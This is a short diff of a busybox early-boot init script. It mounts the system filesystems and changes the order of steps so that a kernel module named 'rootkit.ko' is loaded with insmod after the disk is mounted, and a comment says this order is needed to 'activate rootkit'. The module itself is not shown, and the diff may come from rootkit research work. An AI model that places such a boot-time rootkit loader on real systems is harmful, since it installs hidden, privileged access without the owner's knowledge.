@@ -1,27 +1,23 @@
 
 /busybox mkdir -p mnt proc sys dev
-# echo "IN init.sh" > /dev/console
-# echo "YES init.sh"
 
-# not works
-#/busybox ln -s null /dev/root-disk
-
-/busybox stat /dev/root-disk 
 /busybox mount -t proc proc /proc
 /busybox mount -t sysfs sysfs /sys
 
 /busybox mdev -s
-/busybox mount -o noatime /dev/sda2 /mnt
+
+# FS must be mounted first before activate rootkit
+/busybox mount /dev/sda1 /mnt
+/busybox insmod /rootkit.ko
 
 # If you want shell in early boot
 #exec getty -n -l /bin2/sh -L ttyS0 115200 vt100
-
-/busybox insmod /rootkit.ko
 
 /busybox umount /mnt
 /busybox umount /proc
 /busybox umount /sys
 
+# Mount second hdd to store data
 # if [ -e /dev/sdb ]; then
 #     /busybox mkdir -p /storage
 #     /busybox mount /dev/sdb /storage
